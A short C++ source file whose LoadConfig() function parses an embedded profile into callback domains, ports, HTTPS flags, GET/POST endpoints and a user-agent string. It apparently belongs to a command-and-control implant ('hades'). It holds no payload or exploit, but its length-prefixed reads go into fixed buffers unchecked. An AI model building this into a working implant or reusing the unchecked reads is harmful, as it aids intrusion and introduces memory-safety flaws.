#include "config.hpp"
#include "../utils/bytes.hpp"
#include "../hades/hades.h"
#include <stdio.h>






// todo, clean this up, test code below
BOOL LoadConfig() {

	conf = AllocMemory<Config>(sizeof(struct Config));
	UINT ProfileSize = GetProfileSize();
	g_ByteMgr->InitRead(GetProfile(), ProfileSize);

	conf->domaincounts = g_ByteMgr->Read4();
	for (int i = 0; i < conf->domaincounts; i++) {
		UINT len = g_ByteMgr->Read4();
		g_ByteMgr->ReadInto((PBYTE)conf->domains[i].domain, len);
		conf->domains[i].port = g_ByteMgr->Read4();
		conf->domains[i].isHttps = g_ByteMgr->Read4();
	}

	UINT GetLen = g_ByteMgr->Read4();
	g_ByteMgr->ReadInto((PBYTE)conf->GetEndpoint, GetLen);

	UINT PostLen = g_ByteMgr->Read4();
	g_ByteMgr->ReadInto((PBYTE)conf->PostEndpoint, PostLen);

	UINT UaLen = g_ByteMgr->Read4();
	g_ByteMgr->ReadInto((PBYTE)conf->UA, UaLen);




	DEBUG_LOG("Domain: %s\nPort: %d\nIsHttps: %d\nGet: %s\nPost: %s\nUA: %s\n",
		conf->domains[0].domain,
		conf->domains[0].port,
		conf->domains[0].isHttps,
		conf->GetEndpoint,
		conf->PostEndpoint,
		conf->UA);
	return TRUE;

}

Config* conf = NULL;